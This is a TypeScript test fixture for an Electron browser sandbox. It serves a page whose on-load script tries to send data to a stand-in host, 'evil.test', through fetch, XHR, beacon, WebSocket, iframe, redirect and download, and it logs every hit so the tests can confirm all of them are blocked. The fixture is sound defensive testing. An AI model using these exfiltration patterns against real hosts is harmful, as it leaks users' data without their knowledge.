// Local stand-ins for the sites of tests/browser-window-electron.test.ts: one HTTPS server on
// 127.0.0.1 answering for every test host (the harness maps the names to it with Chromium's
// `host-rules`). `op.test` is the operated site, `assets.test` its parts host, `evil.test` the
// place nothing may reach; every request is recorded by host.
import fs from 'node:fs'
import https from 'node:https'
import path from 'node:path'

export interface Hit { host: string; method: string; path: string; body: string }

const PAGE = `<!doctype html><meta charset="utf-8"><title>operated page</title>
<link rel="stylesheet" href="https://assets.test/a.css">
<script src="https://assets.test/a.js"></script>
<img src="https://assets.test/a.png">
<a id="popup" href="https://evil.test/popup" target="_blank">popup</a>
<a id="js" href="javascript:location='https://evil.test/js'">js</a>
<a id="nav" href="https://evil.test/nav">nav</a>
<a id="redirect-nav" href="/redirect-evil">redirect</a>
<a id="download" href="/file.csv" download>download</a>
<a id="download-evil" href="https://evil.test/file.csv" download>download elsewhere</a>
<form id="form" method="post" action="/ai-form"><input name="a" value="1"></form>
<script>
  // Everything below runs on load: none of it may reach evil.test, nor assets.test beyond its parts.
  fetch('https://evil.test/fetch?d=secret').catch(() => {})
  try { const x = new XMLHttpRequest(); x.open('GET', 'https://evil.test/xhr'); x.send() } catch {}
  new Image().src = 'https://evil.test/img'
  navigator.sendBeacon('https://evil.test/beacon', 'x')
  try { new WebSocket('wss://evil.test/ws') } catch {}
  const frame = document.createElement('iframe'); frame.src = 'https://evil.test/iframe'; document.body.appendChild(frame)
  const assetFrame = document.createElement('iframe'); assetFrame.src = 'https://assets.test/frame'; document.body.appendChild(assetFrame)
  fetch('https://assets.test/data.json').catch(() => {})
  fetch('https://assets.test/post', { method: 'POST', body: 'x', mode: 'no-cors' }).catch(() => {})
  fetch('/redirect-evil').catch(() => {})
  fetch('http://op.test/plain').catch(() => {})
</script>`

export function startSites(certDir: string, port: number): Promise<{ hits: Hit[]; close(): void }> {
  const hits: Hit[] = []
  const server = https.createServer({ key: fs.readFileSync(path.join(certDir, 'key.pem')), cert: fs.readFileSync(path.join(certDir, 'cert.pem')) }, (req, res) => {
    const host = (req.headers.host ?? '').split(':')[0]
    let body = ''
    req.on('data', chunk => { body += chunk })
    req.on('end', () => {
      const url = req.url ?? '/'
      hits.push({ host, method: req.method ?? '', path: url, body })
      if (host === 'op.test' && url === '/') { res.setHeader('content-type', 'text/html; charset=utf-8'); res.end(PAGE); return }
      if (url.startsWith('/redirect-evil')) { res.writeHead(302, { location: 'https://evil.test/redirected' }); res.end(); return }
      if (url === '/file.csv') { res.setHeader('content-type', 'text/csv'); res.setHeader('content-disposition', 'attachment; filename="file.csv"'); res.end('a,b'); return }
      if (url.endsWith('.css')) res.setHeader('content-type', 'text/css')
      else if (url.endsWith('.js')) res.setHeader('content-type', 'text/javascript')
      else if (url.endsWith('.png')) res.setHeader('content-type', 'image/png')
      res.setHeader('access-control-allow-origin', '*')
      res.end(url.endsWith('.js') ? 'window.assetScript = true' : 'ok')
    })
  })
  // A WebSocket handshake reaching the server counts as a hit; it is never accepted.
  server.on('upgrade', (req, socket) => {
    hits.push({ host: (req.headers.host ?? '').split(':')[0], method: 'UPGRADE', path: req.url ?? '/', body: '' })
    socket.destroy()
  })
  return new Promise(resolve => server.listen(port, '127.0.0.1', () => resolve({ hits, close: () => server.close() })))
}
